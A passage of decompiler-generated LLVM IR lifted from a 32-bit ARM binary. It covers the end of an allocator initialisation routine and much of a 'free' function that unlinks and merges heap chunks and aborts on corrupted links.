  store i32 %v0_11a10, i32* %v3_11a10, align 4
  %v0_11a14 = load i32, i32* %lr.global-to-local, align 4
  %v1_11a14 = load i32, i32* %r5.global-to-local, align 4
  %v2_11a14 = add i32 %v1_11a14, %v0_11a14
  store i32 %v2_11a14, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_119d4.dec_label_pc_11a18_crit_edge, %dec_label_pc_11a0c
  %v0_11a1c = phi i32 [ %v0_11a1c.pre, %dec_label_pc_119d4.dec_label_pc_11a18_crit_edge ], [ %v2_11a14, %dec_label_pc_11a0c ]
  %v0_11a18 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a18 = add i32 %v0_11a18, 8
  %v2_11a18 = inttoptr i32 %v1_11a18 to i32*
  %v3_11a18 = load i32, i32* %v2_11a18, align 4
  store i32 %v3_11a18, i32* %r2.global-to-local, align 4
  %v1_11a1c = or i32 %v0_11a1c, 1
  store i32 %v1_11a1c, i32* %r3.global-to-local, align 4
  %v0_11a20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11a20, i32* %v2_11a18, align 4
  %v0_11a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a24 = load i32, i32* %r2.global-to-local, align 4
  %v2_11a24 = add i32 %v1_11a24, 12
  %v3_11a24 = inttoptr i32 %v2_11a24 to i32*
  store i32 %v0_11a24, i32* %v3_11a24, align 4
  %v0_11a28 = load i32, i32* %lr.global-to-local, align 4
  %v1_11a28 = load i32, i32* %r1.global-to-local, align 4
  %v3_11a28 = add i32 %v1_11a28, %v0_11a28
  %v4_11a28 = inttoptr i32 %v3_11a28 to i32*
  store i32 %v0_11a28, i32* %v4_11a28, align 4
  %v0_11a2c = load i32, i32* %r3.global-to-local, align 4
  %v1_11a2c = load i32, i32* %r1.global-to-local, align 4
  %v2_11a2c = add i32 %v1_11a2c, 4
  %v3_11a2c = inttoptr i32 %v2_11a2c to i32*
  store i32 %v0_11a2c, i32* %v3_11a2c, align 4
  %v0_11a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a30 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a30 = add i32 %v1_11a30, 8
  %v3_11a30 = inttoptr i32 %v2_11a30 to i32*
  store i32 %v0_11a30, i32* %v3_11a30, align 4
  %v0_11a34 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a34 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a34 = add i32 %v1_11a34, 12
  %v3_11a34 = inttoptr i32 %v2_11a34 to i32*
  store i32 %v0_11a34, i32* %v3_11a34, align 4
  br label %dec_label_pc_11a4c

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_119c4
  %v2_11a3c = add i32 %v1_119cc, %v0_11a3c
  %v1_11a40 = or i32 %v2_11a3c, 1
  store i32 %v1_11a40, i32* %r3.global-to-local, align 4
  %v1_11a44 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a44 = add i32 %v1_11a44, 4
  %v3_11a44 = inttoptr i32 %v2_11a44 to i32*
  store i32 %v1_11a40, i32* %v3_11a44, align 4
  %v0_11a48 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a48 = load i32, i32* @r4, align 4
  %v2_11a48 = add i32 %v1_11a48, 44
  %v3_11a48 = inttoptr i32 %v2_11a48 to i32*
  store i32 %v0_11a48, i32* %v3_11a48, align 4
  br label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a18, %dec_label_pc_11a3c
  %v0_11a4c = load i32, i32* %sl.global-to-local, align 4
  %v2_11a4c = icmp eq i32 %v0_11a4c, 0
  store i32 %v0_11a4c, i32* %r1.global-to-local, align 4
  br i1 %v2_11a4c, label %dec_label_pc_11a58.loopexit, label %dec_label_pc_11974

dec_label_pc_11a58.loopexit:                      ; preds = %dec_label_pc_11a4c
  %v0_11a58.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_11a58.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11a58

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a58.loopexit, %dec_label_pc_11964
  %v1_11a58 = phi i32 [ %v1_11a58.pre, %dec_label_pc_11a58.loopexit ], [ %v1_11a5810, %dec_label_pc_11964 ]
  %v0_11a60 = phi i32 [ %v0_11a58.pre, %dec_label_pc_11a58.loopexit ], [ %v1_11970, %dec_label_pc_11964 ]
  %v9_11a58 = icmp eq i32 %v0_11a60, %v1_11a58
  br i1 %v9_11a58, label %dec_label_pc_11ad0, label %dec_label_pc_11a60

dec_label_pc_11a60:                               ; preds = %dec_label_pc_11a58
  %v1_11a60 = add i32 %v0_11a60, 4
  store i32 %v1_11a60, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11964

dec_label_pc_11a68.dec_label_pc_11a68_crit_edge:  ; preds = %dec_label_pc_11a68.preheader, %dec_label_pc_11a68.dec_label_pc_11a68_crit_edge
  %v0_11a68.pre = load i32, i32* @r4, align 4
  %v1_11a68.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_11a68 = mul i32 %v1_11a68.pre, 8
  %v5_11a68 = add i32 %v4_11a68, %v0_11a68.pre
  %v1_11a6c = add i32 %v1_11a68.pre, 1
  store i32 %v1_11a6c, i32* %r2.global-to-local, align 4
  %v1_11a70 = add i32 %v5_11a68, 44
  store i32 %v1_11a70, i32* %r3.global-to-local, align 4
  %v2_11a78 = add i32 %v5_11a68, 52
  %v3_11a78 = inttoptr i32 %v2_11a78 to i32*
  store i32 %v1_11a70, i32* %v3_11a78, align 4
  %v0_11a7c = load i32, i32* %r3.global-to-local, align 4
  %v2_11a7c = add i32 %v0_11a7c, 12
  %v3_11a7c = inttoptr i32 %v2_11a7c to i32*
  store i32 %v0_11a7c, i32* %v3_11a7c, align 4
  %v7_11a80 = icmp sgt i32 %v1_11a6c, 95
  br i1 %v7_11a80, label %dec_label_pc_11a84, label %dec_label_pc_11a68.dec_label_pc_11a68_crit_edge

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a68.dec_label_pc_11a68_crit_edge
  %v0_11a84 = load i32, i32* @r4, align 4
  %v1_11a84 = inttoptr i32 %v0_11a84 to i32*
  %v2_11a84 = load i32, i32* %v1_11a84, align 4
  store i32 %v2_11a84, i32* %r2.global-to-local, align 4
  %v1_11a88 = add i32 %v0_11a84, 864
  %v2_11a88 = inttoptr i32 %v1_11a88 to i32*
  %v3_11a88 = load i32, i32* %v2_11a88, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11a90 = urem i32 %v2_11a84, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_11a98 = or i32 %v3_11a88, 1
  store i32 %v1_11a98, i32* %r1.global-to-local, align 4
  %v1_11a9c = or i32 %v1_11a90, 72
  store i32 %v1_11a9c, i32* %r2.global-to-local, align 4
  %v1_11aa0 = add i32 %v0_11a84, 52
  store i32 %v1_11aa0, i32* %ip.global-to-local, align 4
  %v2_11aa4 = add i32 %v0_11a84, 840
  %v3_11aa4 = inttoptr i32 %v2_11aa4 to i32*
  store i32 0, i32* %v3_11aa4, align 4
  %v0_11aa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11aa8 = add i32 %v0_11aa8, 65536
  store i32 %v1_11aa8, i32* %r3.global-to-local, align 4
  %v0_11aac = load i32, i32* %r0.global-to-local, align 4
  %v1_11aac = load i32, i32* @r4, align 4
  %v2_11aac = add i32 %v1_11aac, 836
  %v3_11aac = inttoptr i32 %v2_11aac to i32*
  store i32 %v0_11aac, i32* %v3_11aac, align 4
  %v0_11ab0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ab0 = load i32, i32* @r4, align 4
  %v2_11ab0 = add i32 %v1_11ab0, 844
  %v3_11ab0 = inttoptr i32 %v2_11ab0 to i32*
  store i32 %v0_11ab0, i32* %v3_11ab0, align 4
  %v1_11ab4 = load i32, i32* @r4, align 4
  %v2_11ab4 = add i32 %v1_11ab4, 852
  %v3_11ab4 = inttoptr i32 %v2_11ab4 to i32*
  store i32 %v1_11aa8, i32* %v3_11ab4, align 4
  %v1_11ab8 = load i32, i32* @r4, align 4
  %v2_11ab8 = add i32 %v1_11ab8, 864
  %v3_11ab8 = inttoptr i32 %v2_11ab8 to i32*
  store i32 %v1_11a98, i32* %v3_11ab8, align 4
  %v1_11abc = load i32, i32* @r4, align 4
  %v2_11abc = inttoptr i32 %v1_11abc to i32*
  store i32 %v1_11a9c, i32* %v2_11abc, align 4
  %v0_11ac0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ac0 = load i32, i32* @r4, align 4
  %v2_11ac0 = add i32 %v1_11ac0, 44
  %v3_11ac0 = inttoptr i32 %v2_11ac0 to i32*
  store i32 %v0_11ac0, i32* %v3_11ac0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_11ac8 = call i32 @sysconf(i32 30, i32 %v1_11a98, i32 %v1_11a9c, i32 %v1_11aa8)
  store i32 %v4_11ac8, i32* @r0, align 4
  %v1_11acc = load i32, i32* @r4, align 4
  %v2_11acc = add i32 %v1_11acc, 860
  %v3_11acc = inttoptr i32 %v2_11acc to i32*
  store i32 %v4_11ac8, i32* %v3_11acc, align 4
  br label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11a58, %dec_label_pc_11a84
  %v2_11ad4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11ad4, i32* @r4, align 4
  %v1_11ad8 = load i32, i32* @r0, align 4
  ret i32 %v1_11ad8

; uselistorder directives
  uselistorder i32 %v0_11a84, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11a7c, { 1, 0 }
  uselistorder i32 %v1_11a60, { 1, 0 }
  uselistorder i32 %v0_11a4c, { 0, 2, 1 }
  uselistorder i32 %v0_11a28, { 1, 0 }
  uselistorder i32 %v1_11978, { 1, 0, 2 }
  uselistorder i32 %v0_11990, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11950, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 3, 5, 1, 4, 6 }
  uselistorder i32 860, { 1, 0, 2, 3 }
  uselistorder i32 30, { 1, 13, 2, 7, 3, 8, 4, 9, 5, 10, 0, 11, 12, 6 }
  uselistorder label %dec_label_pc_11ad0, { 1, 0 }
  uselistorder label %dec_label_pc_11a68.dec_label_pc_11a68_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11a4c, { 1, 0 }
  uselistorder label %dec_label_pc_11a18, { 1, 0 }
  uselistorder label %dec_label_pc_11a0c, { 1, 0 }
  uselistorder label %dec_label_pc_11a08, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119c4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_11adc = load i32, i32* @r4, align 4
  %v6_11adc = load i32, i32* @r5, align 4
  %v9_11adc = load i32, i32* @r6, align 4
  %v12_11adc = load i32, i32* @r7, align 4
  %v18_11adc = load i32, i32* @lr, align 4
  %v0_11ae4 = load i32, i32* @r0, align 4
  store i32 %v0_11ae4, i32* @r6, align 4
  %v2_11ae4 = icmp eq i32 %v0_11ae4, 0
  %v2_11ae8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r7, align 4
  br i1 %v2_11ae4, label %dec_label_pc_11cf0, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_11af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 108) to i32*), align 4
  store i32 %v4_11af8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_11af8, i32* %r2.global-to-local, align 4
  %v4_11b04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 68) to i32*), align 4
  store i32 %v4_11b04, i32* %r1.global-to-local, align 4
  store i32 %v2_11ae8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_11b10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  store i32 %v4_11b10, i32* %ip.global-to-local, align 4
  store i32 72476, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11b10)
  %v0_11b1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11b1c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11b24 = load i32, i32* @r7, align 4
  %v2_11b24 = add i32 %v0_11b24, 16
  %v3_11b24 = inttoptr i32 %v2_11b24 to i32*
  %v4_11b24 = load i32, i32* %v3_11b24, align 4
  store i32 %v4_11b24, i32* %ip.global-to-local, align 4
  store i32 72496, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11b24)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11b34 = load i32, i32* @r7, align 4
  %v2_11b34 = add i32 %v0_11b34, 64
  %v3_11b34 = inttoptr i32 %v2_11b34 to i32*
  %v4_11b34 = load i32, i32* %v3_11b34, align 4
  store i32 %v4_11b34, i32* @lr, align 4
  %v0_11b38 = load i32, i32* @r6, align 4
  %v1_11b38 = add i32 %v0_11b38, -4
  %v2_11b38 = inttoptr i32 %v1_11b38 to i32*
  %v3_11b38 = load i32, i32* %v2_11b38, align 4
  store i32 %v3_11b38, i32* %r2.global-to-local, align 4
  %v1_11b3c = inttoptr i32 %v4_11b34 to i32*
  %v2_11b3c = load i32, i32* %v1_11b3c, align 4
  store i32 %v2_11b3c, i32* %r3.global-to-local, align 4
  %v1_11b40 = and i32 %v3_11b38, -4
  store i32 %v1_11b40, i32* %ip.global-to-local, align 4
  %v1_11b44 = add i32 %v0_11b38, -8
  store i32 %v1_11b44, i32* @r5, align 4
  store i32 %v1_11b44, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11b40, %v2_11b3c
  br i1 %tmp, label %dec_label_pc_11b74, label %dec_label_pc_11b54

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11af4
  %v1_11b54 = or i32 %v2_11b3c, 3
  store i32 %v1_11b54, i32* %r3.global-to-local, align 4
  store i32 %v1_11b54, i32* %v1_11b3c, align 4
  %v3_11b58 = load i32, i32* @lr, align 4
  %v4_11b58 = add i32 %v3_11b58, -8
  store i32 %v4_11b58, i32* %lr.global-to-local, align 4
  %v0_11b5c = load i32, i32* %ip.global-to-local, align 4
  %v3_11b5c = udiv i32 %v0_11b5c, 8
  store i32 %v3_11b5c, i32* %r1.global-to-local, align 4
  %v1_11b60 = add i32 %v3_11b58, -4
  store i32 %v1_11b60, i32* %r2.global-to-local, align 4
  %v4_11b64 = mul nuw i32 %v3_11b5c, 4
  %v5_11b64 = add i32 %v4_11b64, %v1_11b60
  %v6_11b64 = inttoptr i32 %v5_11b64 to i32*
  %v7_11b64 = load i32, i32* %v6_11b64, align 4
  store i32 %v7_11b64, i32* %r3.global-to-local, align 4
  %v1_11b68 = load i32, i32* @r5, align 4
  %v2_11b68 = add i32 %v1_11b68, 8
  %v3_11b68 = inttoptr i32 %v2_11b68 to i32*
  store i32 %v7_11b64, i32* %v3_11b68, align 4
  %v0_11b6c = load i32, i32* @r5, align 4
  %v1_11b6c = load i32, i32* %r2.global-to-local, align 4
  %v2_11b6c = load i32, i32* %r1.global-to-local, align 4
  %v5_11b6c = mul i32 %v2_11b6c, 4
  %v6_11b6c = add i32 %v5_11b6c, %v1_11b6c
  %v7_11b6c = inttoptr i32 %v6_11b6c to i32*
  store i32 %v0_11b6c, i32* %v7_11b6c, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11af4
  %v1_11b74 = and i32 %v3_11b38, 2
  %v2_11b74 = icmp eq i32 %v1_11b74, 0
  br i1 %v2_11b74, label %dec_label_pc_11b7c, label %dec_label_pc_11cb0

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b74
  %v1_11b7c = or i32 %v2_11b3c, 1
  store i32 %v1_11b7c, i32* %r3.global-to-local, align 4
  store i32 %v1_11b7c, i32* %v1_11b3c, align 4
  %v0_11b84 = load i32, i32* @r6, align 4
  %v1_11b84 = add i32 %v0_11b84, -4
  %v2_11b84 = inttoptr i32 %v1_11b84 to i32*
  %v3_11b84 = load i32, i32* %v2_11b84, align 4
  store i32 %v3_11b84, i32* %r3.global-to-local, align 4
  %v0_11b88 = load i32, i32* @r5, align 4
  %v1_11b88 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b88 = add i32 %v1_11b88, %v0_11b88
  store i32 %v2_11b88, i32* %lr.global-to-local, align 4
  %v1_11b8c = urem i32 %v3_11b84, 2
  %v2_11b8c = icmp eq i32 %v1_11b8c, 0
  %v1_11b90 = add i32 %v2_11b88, 4
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %r8.global-to-local, align 4
  br i1 %v2_11b8c, label %dec_label_pc_11b98, label %dec_label_pc_11bcc

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b7c
  %v1_11b98 = add i32 %v0_11b84, -8
  %v2_11b98 = inttoptr i32 %v1_11b98 to i32*
  %v3_11b98 = load i32, i32* %v2_11b98, align 4
  store i32 %v3_11b98, i32* %r1.global-to-local, align 4
  %v2_11b9c = sub i32 %v0_11b88, %v3_11b98
  store i32 %v2_11b9c, i32* %r3.global-to-local, align 4
  %v1_11ba0 = add i32 %v2_11b9c, 8
  %v2_11ba0 = inttoptr i32 %v1_11ba0 to i32*
  %v3_11ba0 = load i32, i32* %v2_11ba0, align 4
  store i32 %v3_11ba0, i32* %r2.global-to-local, align 4
  %v1_11ba4 = add i32 %v3_11ba0, 12
  %v2_11ba4 = inttoptr i32 %v1_11ba4 to i32*
  %v3_11ba4 = load i32, i32* %v2_11ba4, align 4
  store i32 %v3_11ba4, i32* %r4.global-to-local, align 4
  %v9_11ba8 = icmp eq i32 %v3_11ba4, %v2_11b9c
  %v1_11bac = add i32 %v2_11b9c, 12
  %v2_11bac = inttoptr i32 %v1_11bac to i32*
  %v3_11bac = load i32, i32* %v2_11bac, align 4
  store i32 %v3_11bac, i32* %r0.global-to-local, align 4
  br i1 %v9_11ba8, label %dec_label_pc_11bb4, label %dec_label_pc_11c18

dec_label_pc_11bb4:                               ; preds = %dec_label_pc_11b98
  %v1_11bb4 = add i32 %v3_11bac, 8
  %v2_11bb4 = inttoptr i32 %v1_11bb4 to i32*
  %v3_11bb4 = load i32, i32* %v2_11bb4, align 4
  store i32 %v3_11bb4, i32* %r3.global-to-local, align 4
  %v9_11bb8 = icmp eq i32 %v3_11bb4, %v2_11b9c
  br i1 %v9_11bb8, label %dec_label_pc_11bc0, label %dec_label_pc_11c18

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb4
  store i32 %v3_11ba0, i32* %v2_11bb4, align 4
  %v0_11bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_11bc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_11bc4 = add i32 %v1_11bc4, 12
  %v3_11bc4 = inttoptr i32 %v2_11bc4 to i32*
  store i32 %v0_11bc4, i32* %v3_11bc4, align 4
  %v0_11bc8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11bc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11bc8 = add i32 %v1_11bc8, %v0_11bc8
  store i32 %v2_11bc8, i32* %ip.global-to-local, align 4
  %v0_11bd8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11bdc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11b7c, %dec_label_pc_11bc0
  %v0_11c58 = phi i32 [ %v1_11b88, %dec_label_pc_11b7c ], [ %v2_11bc8, %dec_label_pc_11bc0 ]
  %v0_11bdc = phi i32 [ %v3_11b90, %dec_label_pc_11b7c ], [ %v0_11bdc.pre, %dec_label_pc_11bc0 ]
  %v1_11bf0 = phi i32 [ %v2_11b88, %dec_label_pc_11b7c ], [ %v0_11bd8.pre, %dec_label_pc_11bc0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11bd0 = load i32, i32* @r7, align 4
  %v2_11bd0 = add i32 %v0_11bd0, 64
  %v3_11bd0 = inttoptr i32 %v2_11bd0 to i32*
  %v4_11bd0 = load i32, i32* %v3_11bd0, align 4
  store i32 %v4_11bd0, i32* %r2.global-to-local, align 4
  %v1_11bd4 = add i32 %v4_11bd0, 44
  %v2_11bd4 = inttoptr i32 %v1_11bd4 to i32*
  %v3_11bd4 = load i32, i32* %v2_11bd4, align 4
  store i32 %v3_11bd4, i32* %r3.global-to-local, align 4
  %v9_11bd8 = icmp eq i32 %v1_11bf0, %v3_11bd4
  %v1_11bdc = and i32 %v0_11bdc, -4
  store i32 %v1_11bdc, i32* %r0.global-to-local, align 4
  br i1 %v9_11bd8, label %dec_label_pc_11c58, label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bcc
  %v2_11be4 = add i32 %v1_11bf0, %v1_11bdc
  store i32 %v2_11be4, i32* %r3.global-to-local, align 4
  %v1_11be8 = add i32 %v2_11be4, 4
  %v2_11be8 = inttoptr i32 %v1_11be8 to i32*
  %v3_11be8 = load i32, i32* %v2_11be8, align 4
  store i32 %v3_11be8, i32* %r3.global-to-local, align 4
  %v1_11bec = urem i32 %v3_11be8, 2
  %v2_11bec = icmp eq i32 %v1_11bec, 0
  %v2_11bf0 = add i32 %v1_11bf0, 4
  %v3_11bf0 = inttoptr i32 %v2_11bf0 to i32*
  store i32 %v1_11bdc, i32* %v3_11bf0, align 4
  br i1 %v2_11bec, label %dec_label_pc_11bf8, label %dec_label_pc_11be4.dec_label_pc_11c28_crit_edge

dec_label_pc_11be4.dec_label_pc_11c28_crit_edge:  ; preds = %dec_label_pc_11be4
  %v0_11c38.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c28

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11be4
  %v0_11bf8 = load i32, i32* %lr.global-to-local, align 4
  %v1_11bf8 = add i32 %v0_11bf8, 8
  %v2_11bf8 = inttoptr i32 %v1_11bf8 to i32*
  %v3_11bf8 = load i32, i32* %v2_11bf8, align 4
  store i32 %v3_11bf8, i32* %r1.global-to-local, align 4
  %v1_11bfc = add i32 %v3_11bf8, 12
  %v2_11bfc = inttoptr i32 %v1_11bfc to i32*
  %v3_11bfc = load i32, i32* %v2_11bfc, align 4
  store i32 %v3_11bfc, i32* %r3.global-to-local, align 4
  %v9_11c00 = icmp eq i32 %v3_11bfc, %v0_11bf8
  %v1_11c04 = add i32 %v0_11bf8, 12
  %v2_11c04 = inttoptr i32 %v1_11c04 to i32*
  %v3_11c04 = load i32, i32* %v2_11c04, align 4
  store i32 %v3_11c04, i32* %r2.global-to-local, align 4
  br i1 %v9_11c00, label %dec_label_pc_11c0c, label %dec_label_pc_11c18

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11bf8
  %v1_11c0c = add i32 %v3_11c04, 8
  %v2_11c0c = inttoptr i32 %v1_11c0c to i32*
  %v3_11c0c = load i32, i32* %v2_11c0c, align 4
  store i32 %v3_11c0c, i32* %r3.global-to-local, align 4
  %v9_11c10 = icmp eq i32 %v3_11c0c, %v0_11bf8
  br i1 %v9_11c10, label %dec_label_pc_11c1c, label %dec_label_pc_11c18

dec_label_pc_11c18:                               ; preds = %dec_label_pc_11bf8, %dec_label_pc_11bb4, %dec_label_pc_11b98, %dec_label_pc_11c0c
  %v0_11c18 = call i32 @abort()
  store i32 %v0_11c18, i32* %r0.global-to-local, align 4
  %v0_11c1c.pre = load i32, i32* @r1, align 4
  %v1_11c1c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c18
  %v1_11c1c = phi i32 [ %v3_11c04, %dec_label_pc_11c0c ], [ %v1_11c1c.pre, %dec_label_pc_11c18 ]
  %v0_11c1c = phi i32 [ %v3_11bf8, %dec_label_pc_11c0c ], [ %v0_11c1c.pre, %dec_label_pc_11c18 ]
  %v2_11c1c = add i32 %v1_11c1c, 8
  %v3_11c1c = inttoptr i32 %v2_11c1c to i32*
  store i32 %v0_11c1c, i32* %v3_11c1c, align 4
  %v0_11c20 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c20 = add i32 %v1_11c20, 12
  %v3_11c20 = inttoptr i32 %v2_11c20 to i32*
  store i32 %v0_11c20, i32* %v3_11c20, align 4
  %v0_11c24 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c24 = load i32, i32* %r0.global-to-local, align 4
  %v2_11c24 = add i32 %v1_11c24, %v0_11c24
  store i32 %v2_11c24, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c28

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11be4.dec_label_pc_11c28_crit_edge, %dec_label_pc_11c1c
  %v0_11c38 = phi i32 [ %v0_11c38.pre, %dec_label_pc_11be4.dec_label_pc_11c28_crit_edge ], [ %v2_11c24, %dec_label_pc_11c1c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11c2c = load i32, i32* @r7, align 4
  %v2_11c2c = add i32 %v0_11c2c, 64
  %v3_11c2c = inttoptr i32 %v2_11c2c to i32*
  %v4_11c2c = load i32, i32* %v3_11c2c, align 4
  %v1_11c30 = add i32 %v4_11c2c, 52
  store i32 %v1_11c30, i32* %r3.global-to-local, align 4
  %v1_11c34 = add i32 %v4_11c2c, 60
  %v2_11c34 = inttoptr i32 %v1_11c34 to i32*
  %v3_11c34 = load i32, i32* %v2_11c34, align 4
  store i32 %v3_11c34, i32* %r1.global-to-local, align 4
  %v1_11c38 = or i32 %v0_11c38, 1
  store i32 %v1_11c38, i32* %r2.global-to-local, align 4
  %v1_11c3c = load i32, i32* %r4.global-to-local, align 4
  %v2_11c3c = add i32 %v1_11c3c, 12
  %v3_11c3c = inttoptr i32 %v2_11c3c to i32*
  store i32 %v1_11c30, i32* %v3_11c3c, align 4
  %v0_11c40 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c40 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c40 = add i32 %v1_11c40, 8
  %v3_11c40 = inttoptr i32 %v2_11c40 to i32*
  store i32 %v0_11c40, i32* %v3_11c40, align 4
  %v0_11c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c44 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c44 = add i32 %v1_11c44, 4
  %v3_11c44 = inttoptr i32 %v2_11c44 to i32*
  store i32 %v0_11c44, i32* %v3_11c44, align 4
  %v0_11c48 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c48 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c48 = add i32 %v1_11c48, %v0_11c48
  %v4_11c48 = inttoptr i32 %v3_11c48 to i32*
  store i32 %v0_11c48, i32* %v4_11c48, align 4
  %v0_11c4c = load i32, i32* %r4.global-to-local, align 4
  %v1_11c4c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c4c = add i32 %v1_11c4c, 12
  %v3_11c4c = inttoptr i32 %v2_11c4c to i32*
  store i32 %v0_11c4c, i32* %v3_11c4c, align 4
  %v0_11c50 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c50 = load i32, i32* %r3.global-to-local, align 4
  %v2_11c50 = add i32 %v1_11c50, 8
  %v3_11c50 = inttoptr i32 %v2_11c50 to i32*
  store i32 %v0_11c50, i32* %v3_11c50, align 4
  br label %dec_label_pc_11c68

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11bcc
  %v2_11c58 = add i32 %v1_11bdc, %v0_11c58
  store i32 %v2_11c58, i32* %ip.global-to-local, align 4
  %v1_11c5c = or i32 %v2_11c58, 1
  store i32 %v1_11c5c, i32* %r3.global-to-local, align 4
  %v0_11c60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11c60, i32* %v2_11bd4, align 4
  %v0_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c64 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c64 = add i32 %v1_11c64, 4
  %v3_11c64 = inttoptr i32 %v2_11c64 to i32*
  store i32 %v0_11c64, i32* %v3_11c64, align 4
  br label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c28, %dec_label_pc_11c58
  %v0_11c68 = load i32, i32* %ip.global-to-local, align 4
  %v3_11c6c = icmp ult i32 %v0_11c68, 131070
  br i1 %v3_11c6c, label %dec_label_pc_11cd8, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c68
